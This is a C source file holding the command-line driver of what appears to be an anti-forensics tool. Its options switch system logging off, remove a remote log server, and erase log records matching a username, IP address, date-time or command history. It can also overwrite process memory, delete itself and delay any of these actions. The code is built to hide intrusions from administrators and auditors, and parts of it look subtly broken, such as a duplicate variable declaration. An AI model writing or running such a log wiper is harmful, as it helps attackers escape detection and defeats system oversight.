


#include "utils.h"

#include "kvm.h"

#include "mem.h"

#include "cli.h"

#include "main.h"


//#define MY_TEST_INTERFACE


int test(int argc,char ** argv){
	
#ifdef MY_TEST_INTERFACE
	char buf[1024]={0};
	buf[0]= '\t';
	buf[1]= 'A';
	buf[2]= 'B';
	char buffer[1024]={0};
	sprintf(buffer,"%s",buf);
	printf("string:%s\r\n",buffer);
	int idx = 0;
	while(buffer[idx]){
		printf("number:%d,value:%x\r\n",idx,buffer[idx]);
		idx++;
	}

	int privilige = check_securelevel();
	printf("priv:%d\r\n",privilige);
	
	if(argc < 2){
		printf("usage:%s pid\r\n",argv[0]);
		return 0;
	}
	pid_t pid = (pid_t)atoi(argv[1]);
	printf("pid:%d\r\n",pid);
	writeProcesData((pid_t)pid,(char*)argv[0],(char*)argv[0]);
	printf("%s ok\r\n",__FUNCTION__);
	return 0;

	struct proc processinfo;
	pid_t pid = (pid_t) atoi(argv[1]);
	
	get_proc_vm_regions(pid);
	get_proc_by_pid_kvmprocs(pid,&processinfo);
	find_proc_by_pid(pid,&processinfo);
#endif
	return 0;
}




int MyStart(int argc,char * param1,char * param2,char * null,char * env){
	
	int i = 0;
	//for(i = 0;i < arc;i ++)
	{
			printf("param[%d]:%s\r\n",1, param1);
			printf("param[%d]:%s\r\n",2, param1);
	}
	return 0;
}



int main (int argc,char ** argv){

	int ret = 0;
	
	int ch = 0;
	
	int delay_second = 0;
	
	int action = 0;
	
	char * param = 0;
	
	ret = test(argc,argv);
	
	while ((ch = getopt(argc, argv, "g:rd:ecos:p:t:h:l")) != -1)
	{
        printf("optind: %d\n", optind);
        switch (ch) 
        {
			case 'c':
			{
				printf("close log\r\n");
				ret = SetLogOff();
				break;
			}
			/*
			case 'e':
			{
				printf("erase log\r\n");
				ret = EraseLog();
				break;
			}
			*/
			case 'o':
			{
				printf("open log\r\n");
				ret = SetLogOn();
				break;
			}
			case 's':
			{
				char * server = optarg;
				printf("server: %s\n", server+1);
				if(server[0]== 's'){
					ret = SetLogServer(&server[1]);
				}
				else if(server[0]== 'r'){
					ret = RemoveLogServer(&server[1]);
				}
				break;
			}
			case 'l':
			{
				
				g_trace_log = 1;
				break;
			}
			case 'd':
			{	
				param = optarg;
				printf("delete logging with arg:%s\r\n",param);
				ret = isIPAddr(param);
				if(ret){
					action = ACTION_DEL_IP;
				}
				else{
					action = ACTION_DEL_USERNAME;
				}

				break;
			}
			case 'h':
			{
				param = optarg;
				action = ACTION_DEL_CMD;
				
				break;
			}
			case 't':
			{
				param = optarg;

				action = ACTION_DEL_DATETIME;
				break;
			}
			case 'p':
			{
				int sec = atoi(optarg);
				if(sec > 0){
					delay_second = sec;
				}
				break;
			}
			case 'r':
			{
				DeleteSelf();
				break;
			}
			case 'g':
			{
				param = optarg;
				action = ACTION_REPLACE;
				break;
			}
			default:
			{
				break;
			}
		}	
	}
	
	if(delay_second){
		if(action == ACTION_DEL_USERNAME){
			ret = DelayExec(delay_second,DeleteLabel,param);
		}
		else if(action == ACTION_DEL_IP){
			ret = DelayExec(delay_second,DeleteAddr,param);
		}
		else if(action == ACTION_DEL_DATETIME){
			ret = DelayExec(delay_second,DeleteDateTime,param);
		}
		else if(action == ACTION_DEL_CMD){
			ret = DelayExec(delay_second,DeleteHistory,param);
		}	
		else if(action == ACTION_REPLACE){
			ret = DelayExec (delay_second,ReplaceMem,param);
		}
	}
	else{
		if(action == ACTION_DEL_USERNAME){
			ret = DeleteLabel(param);
		}
		else if(action == ACTION_DEL_IP){
			ret = DeleteAddr(param);
		}
		else if(action == ACTION_DEL_DATETIME){
			ret = DeleteDateTime(param);
		}
		else if(action == ACTION_DEL_CMD){
			ret = DeleteHistory(param);
		}	
		else if(action == ACTION_REPLACE){
			ret = ReplaceMem(param);
		}
	}
	
	return ret;
}
